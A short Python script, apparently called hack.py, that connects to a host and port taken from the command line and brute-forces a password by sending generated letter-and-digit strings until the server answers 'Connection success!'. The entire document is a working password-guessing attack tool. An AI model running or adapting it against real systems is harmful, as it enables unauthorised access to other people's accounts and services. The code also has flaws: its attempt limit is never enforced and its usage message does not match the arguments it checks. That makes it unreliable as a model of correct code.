import itertools
import socket
import sys
from string import ascii_lowercase, digits


class Remote:
    def __init__(self):
        self.client_socket = socket.socket()
        self.limit = 1000000
        self.buffer = 1024
        self.password = ''
        self.attempts = 0

    @staticmethod
    def argv():
        """Used to call arguments from the command line"""
        if (len(sys.argv) != 3) or ('-h' in sys.argv):
            print('Usage: hack.py address port message')
            sys.exit()
        else:
            try:
                ipaddress, port = sys.argv[1], sys.argv[2]
                return ipaddress, int(port)
            except ValueError:
                print(f'The argument "port" should be a number, arg was: {sys.argv[2]}')
                sys.exit()

    @staticmethod
    def generate():
        """Generates passwords in sequence start from 'a'"""
        pool = ascii_lowercase + digits
        for length in range(1, 32):
            for attempt in itertools.product(pool, repeat=length):
                yield ''.join(attempt)
            length += 1

    def connect(self, address: tuple):
        """Connect to the host"""
        self.client_socket.connect(address)

    def disconnect(self):
        """Close the connection to the host"""
        self.client_socket.close()

    def message(self, msg: str):
        """Sends a message (str) to the host and returns the response (str)"""
        self.client_socket.send(msg.encode())
        return self.client_socket.recv(self.buffer).decode()

    def brute(self, source: itertools):
        """Attempt brute force attacks. Returns the password or error. Takes """
        while self.attempts < self.limit:
            self.password = next(source)
            response = self.message(self.password)
            if response == 'Connection success!':
                return self.password
            elif response == 'Wrong password!':
                pass
            elif response == 'Too many attempts':
                return response
            else:
                continue


if __name__ == '__main__':

    terminal = Remote()
    host = terminal.argv()
    terminal.connect(host)
    pass_iter = terminal.generate()
    print(terminal.brute(pass_iter))
    terminal.disconnect()
